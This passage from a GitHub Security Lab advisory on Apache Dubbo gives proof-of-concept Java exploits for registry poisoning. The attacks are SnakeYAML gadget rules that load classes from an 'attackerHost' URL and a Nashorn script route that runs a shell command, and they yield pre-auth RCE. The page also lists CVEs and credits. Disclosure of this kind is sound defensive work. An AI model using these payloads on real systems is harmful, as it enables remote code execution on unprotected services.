        <span class="nc">String</span> <span class="n">path</span> <span class="o">=</span> <span class="s">"/dubbo/config/dubbo/"</span> <span class="o">+</span> <span class="n">consumer_app_name</span> <span class="o">+</span> <span class="s">".condition-router"</span><span class="o">;</span>

        <span class="nc">String</span> <span class="n">rule</span> <span class="o">=</span> <span class="s">"---\n"</span> <span class="o">+</span>
                <span class="s">"conditions:\n"</span> <span class="o">+</span>
                <span class="s">" - !!javax.script.ScriptEngineManager [\n"</span> <span class="o">+</span>
                <span class="s">"   !!java.net.URLClassLoader [[\n"</span> <span class="o">+</span>
                <span class="s">"     !!java.net.URL [\""</span> <span class="o">+</span> <span class="n">attackerHost</span> <span class="o">+</span> <span class="s">"\"]\n"</span> <span class="o">+</span>
                <span class="s">"   ]]\n"</span> <span class="o">+</span>
                <span class="s">" ]"</span><span class="o">;</span>

        <span class="k">try</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">client</span><span class="o">.</span><span class="na">checkExists</span><span class="o">().</span><span class="na">forPath</span><span class="o">(</span><span class="n">path</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">client</span><span class="o">.</span><span class="na">create</span><span class="o">().</span><span class="na">creatingParentsIfNeeded</span><span class="o">().</span><span class="na">forPath</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="n">client</span><span class="o">.</span><span class="na">setData</span><span class="o">().</span><span class="na">forPath</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="n">rule</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>

        <span class="nc">System</span><span class="o">.</span><span class="na">in</span><span class="o">.</span><span class="na">read</span><span class="o">();</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">client</span><span class="o">.</span><span class="na">checkExists</span><span class="o">().</span><span class="na">forPath</span><span class="o">(</span><span class="n">path</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">client</span><span class="o">.</span><span class="na">create</span><span class="o">().</span><span class="na">creatingParentsIfNeeded</span><span class="o">().</span><span class="na">forPath</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="n">client</span><span class="o">.</span><span class="na">setData</span><span class="o">().</span><span class="na">forPath</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="s">""</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
    <span class="o">}</span>
</code></pre></div></div>

<h4 id="impact-7">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">pre-auth RCE</code></p>

<h3 id="issue-9-rce-on-customers-via-script-route-poisoning-nashorn-script-injection-ghsl-2021-042">Issue 9: RCE on customers via Script route poisoning (Nashorn script injection) (GHSL-2021-042)</h3>
<p>Apache Dubbo supports <a href="https://dubbo.apache.org/en/docs/v2.7/user/examples/routing-rule/#script-routing-rules">Script routing</a> which will enable a customer to route the request to the right server. These rules are loaded into the configuration center (eg: Zookeeper, Nacos, …) and retrieved by the customers when making a request in order to find the right endpoint.</p>

<p>When parsing these rules, Dubbo customers will use the JRE <code class="language-plaintext highlighter-rouge">ScriptEngineManager</code> to load an <code class="language-plaintext highlighter-rouge">ScriptEngine</code> and <a href="https://github.com/apache/dubbo/blob/f4b225eb3a5acdf7c9064763f522ea0b86421c8d/dubbo-cluster/src/main/java/org/apache/dubbo/rpc/cluster/router/script/ScriptRouter.java#L115">run the rule provided by the script</a> which by default will enable executing arbitrary Java code:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="nf">ScriptRouter</span><span class="o">(</span><span class="no">URL</span> <span class="n">url</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">url</span> <span class="o">=</span> <span class="n">url</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">priority</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="no">PRIORITY_KEY</span><span class="o">,</span> <span class="no">SCRIPT_ROUTER_DEFAULT_PRIORITY</span><span class="o">);</span>

        <span class="n">engine</span> <span class="o">=</span> <span class="n">getEngine</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
        <span class="n">rule</span> <span class="o">=</span> <span class="n">getRule</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">Compilable</span> <span class="n">compilable</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Compilable</span><span class="o">)</span> <span class="n">engine</span><span class="o">;</span>
            <span class="n">function</span> <span class="o">=</span> <span class="n">compilable</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="n">rule</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">ScriptException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">"route error, rule has been ignored. rule: "</span> <span class="o">+</span> <span class="n">rule</span> <span class="o">+</span>
                    <span class="s">", url: "</span> <span class="o">+</span> <span class="nc">RpcContext</span><span class="o">.</span><span class="na">getContext</span><span class="o">().</span><span class="na">getUrl</span><span class="o">(),</span> <span class="n">e</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
     
    <span class="o">...</span>

    <span class="kd">public</span> <span class="o">&lt;</span><span class="no">T</span><span class="o">&gt;</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">Invoker</span><span class="o">&lt;</span><span class="no">T</span><span class="o">&gt;&gt;</span> <span class="nf">route</span><span class="o">(</span><span class="nc">List</span><span class="o">&lt;</span><span class="nc">Invoker</span><span class="o">&lt;</span><span class="no">T</span><span class="o">&gt;&gt;</span> <span class="n">invokers</span><span class="o">,</span> <span class="no">URL</span> <span class="n">url</span><span class="o">,</span> <span class="nc">Invocation</span> <span class="n">invocation</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">RpcException</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">Bindings</span> <span class="n">bindings</span> <span class="o">=</span> <span class="n">createBindings</span><span class="o">(</span><span class="n">invokers</span><span class="o">,</span> <span class="n">invocation</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">function</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">return</span> <span class="n">invokers</span><span class="o">;</span>
            <span class="o">}</span>
            <span class="k">return</span> <span class="nf">getRoutedInvokers</span><span class="o">(</span><span class="n">function</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span><span class="n">bindings</span><span class="o">));</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">ScriptException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">"route error, rule has been ignored. rule: "</span> <span class="o">+</span> <span class="n">rule</span> <span class="o">+</span> <span class="s">", method:"</span> <span class="o">+</span>
                    <span class="n">invocation</span><span class="o">.</span><span class="na">getMethodName</span><span class="o">()</span> <span class="o">+</span> <span class="s">", url: "</span> <span class="o">+</span> <span class="nc">RpcContext</span><span class="o">.</span><span class="na">getContext</span><span class="o">().</span><span class="na">getUrl</span><span class="o">(),</span> <span class="n">e</span><span class="o">);</span>
            <span class="k">return</span> <span class="n">invokers</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>An attacker with access to the Registry (Zookeeper supports authentication but its is disabled by default and in most installations, and other systems such as Nacos do not even support authentication) will be able to poison a script route so that when it is retrieved by the consumers, it will get RCE on all of them.</p>

<p>For example, the following program will deploy a Script Route rule which, when download by the customers, will create a file named <code class="language-plaintext highlighter-rouge">/tmp/pwned</code> in the customer’s file system.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="c1">// settings</span>
        <span class="nc">String</span> <span class="n">service_name</span> <span class="o">=</span> <span class="s">"org.apache.dubbo.samples.basic.api.DemoService"</span><span class="o">;</span>

        <span class="c1">// https://mbechler.github.io/2019/03/02/Beware-the-Nashorn/</span>
        <span class="nc">String</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec(\\\"touch /tmp/pwned\\\")');"</span><span class="o">;</span>

        <span class="nc">RegistryFactory</span> <span class="n">registryFactory</span> <span class="o">=</span> <span class="nc">ExtensionLoader</span><span class="o">.</span><span class="na">getExtensionLoader</span><span class="o">(</span><span class="nc">RegistryFactory</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">getAdaptiveExtension</span><span class="o">();</span>
        <span class="nc">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">registryFactory</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="no">URL</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="s">"zookeeper://127.0.0.1:2181"</span><span class="o">));</span>
        <span class="n">registry</span><span class="o">.</span><span class="na">register</span><span class="o">(</span><span class="no">URL</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="s">"script://0.0.0.0/"</span> <span class="o">+</span> <span class="n">service_name</span> <span class="o">+</span> <span class="s">"?category=routers&amp;dynamic=false&amp;rule="</span> <span class="o">+</span> <span class="no">URL</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="s">"(function route(invokers) { "</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s">" return invokers; } (invokers))"</span><span class="o">)));</span>
    <span class="o">}</span>
</code></pre></div></div>

<h4 id="impact-8">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">pre-auth RCE</code></p>

<h3 id="issue-10-rce-on-providers-via-configuration-poisoning-unsafe-yaml-unmarshaling-ghsl-2021-043">Issue 10: RCE on providers via Configuration poisoning (Unsafe YAML unmarshaling) (GHSL-2021-043)</h3>
<p>The providers are similarly vulnerable since they can read dynamic configurations from the registry and then <a href="https://github.com/apache/dubbo/blob/f4b225eb3a5acdf7c9064763f522ea0b86421c8d/dubbo-registry/dubbo-registry-api/src/main/java/org/apache/dubbo/registry/integration/AbstractConfiguratorListener.java"><code class="language-plaintext highlighter-rouge">AbstractConfiguratorListener</code></a> will use <a href="https://github.com/apache/dubbo/blob/f4b225eb3a5acdf7c9064763f522ea0b86421c8d/dubbo-cluster/src/main/java/org/apache/dubbo/rpc/cluster/configurator/parser/ConfigParser.java"><code class="language-plaintext highlighter-rouge">ConfigParser</code></a> to parse the YAML configuration files:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ConfigParser</span>
    <span class="o">...</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="o">&lt;</span><span class="no">T</span><span class="o">&gt;</span> <span class="no">T</span> <span class="nf">parseObject</span><span class="o">(</span><span class="nc">String</span> <span class="n">rawConfig</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Constructor</span><span class="o">(</span><span class="nc">ConfiguratorConfig</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="nc">TypeDescription</span> <span class="n">itemDescription</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TypeDescription</span><span class="o">(</span><span class="nc">ConfiguratorConfig</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">itemDescription</span><span class="o">.</span><span class="na">addPropertyParameters</span><span class="o">(</span><span class="s">"items"</span><span class="o">,</span> <span class="nc">ConfigItem</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">constructor</span><span class="o">.</span><span class="na">addTypeDescription</span><span class="o">(</span><span class="n">itemDescription</span><span class="o">);</span>

        <span class="nc">Yaml</span> <span class="n">yaml</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Yaml</span><span class="o">(</span><span class="n">constructor</span><span class="o">);</span>
        <span class="k">return</span> <span class="n">yaml</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="n">rawConfig</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="o">...</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Similarly to the vulnerabilities on the customer side, the provider one also involves using an unsafe configuration of the <code class="language-plaintext highlighter-rouge">SnakeYaml</code> parser. Even though Dubbo enforces a root type (in this case <code class="language-plaintext highlighter-rouge">ConfiguratorConfig</code>) it is still possible to instantiate arbitrary types by calling their default or custom constructors for any nested objects.</p>

<p>For example, the following program will upload a malicious configuration to the Registry which will create a file named <code class="language-plaintext highlighter-rouge">/tmp/pwned</code> in the provider’s file system.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>

        <span class="n">client</span> <span class="o">=</span> <span class="nc">CuratorFrameworkFactory</span><span class="o">.</span><span class="na">newClient</span><span class="o">(</span><span class="n">zookeeperHost</span> <span class="o">+</span> <span class="s">":2181"</span><span class="o">,</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">1000</span><span class="o">,</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">1000</span><span class="o">,</span> <span class="k">new</span> <span class="nc">ExponentialBackoffRetry</span><span class="o">(</span><span class="mi">1000</span><span class="o">,</span> <span class="mi">3</span><span class="o">));</span>
        <span class="n">client</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>

        <span class="nc">String</span> <span class="n">path</span> <span class="o">=</span> <span class="s">"/dubbo/config/dubbo/"</span> <span class="o">+</span> <span class="n">provider_app_name</span> <span class="o">+</span> <span class="s">".configurators"</span><span class="o">;</span>

        <span class="nc">String</span> <span class="n">rule</span> <span class="o">=</span> <span class="s">"---\n"</span> <span class="o">+</span>
                <span class="s">"configs:\n"</span> <span class="o">+</span>
                <span class="s">" - !!javax.script.ScriptEngineManager [\n"</span> <span class="o">+</span>
                <span class="s">"   !!java.net.URLClassLoader [[\n"</span> <span class="o">+</span>
                <span class="s">"     !!java.net.URL [\""</span> <span class="o">+</span> <span class="n">attackerHost</span> <span class="o">+</span> <span class="s">"\"]\n"</span> <span class="o">+</span>
                <span class="s">"   ]]\n"</span> <span class="o">+</span>
                <span class="s">" ]"</span><span class="o">;</span>

        <span class="k">try</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">client</span><span class="o">.</span><span class="na">checkExists</span><span class="o">().</span><span class="na">forPath</span><span class="o">(</span><span class="n">path</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">client</span><span class="o">.</span><span class="na">create</span><span class="o">().</span><span class="na">creatingParentsIfNeeded</span><span class="o">().</span><span class="na">forPath</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="n">client</span><span class="o">.</span><span class="na">setData</span><span class="o">().</span><span class="na">forPath</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="n">rule</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>

        <span class="nc">System</span><span class="o">.</span><span class="na">in</span><span class="o">.</span><span class="na">read</span><span class="o">();</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">client</span><span class="o">.</span><span class="na">checkExists</span><span class="o">().</span><span class="na">forPath</span><span class="o">(</span><span class="n">path</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">client</span><span class="o">.</span><span class="na">create</span><span class="o">().</span><span class="na">creatingParentsIfNeeded</span><span class="o">().</span><span class="na">forPath</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="n">client</span><span class="o">.</span><span class="na">setData</span><span class="o">().</span><span class="na">forPath</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="s">""</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
    <span class="o">}</span>
</code></pre></div></div>

<h4 id="impact-9">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">pre-auth RCE</code></p>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2021-25641: GHSL-2021-035 (2)</li>
  <li>CVE-2021-30179: GHSL-2021-037 (4), GHSL-2021-038 (5)</li>
  <li>CVE-2021-32824: GHSL-2021-039 (6)</li>
  <li>CVE-2021-30180: GHSL-2021-040 (7), GHSL-2021-041 (8), GHSL-2021-043 (10)</li>
  <li>CVE-2021-30181: GHSL-2021-042 (9)</li>
</ul>

<h2 id="credit">Credit</h2>
<p>These issues were discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester(Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-{034,035,036,037,038,039,040}</code> in any communication regarding this issu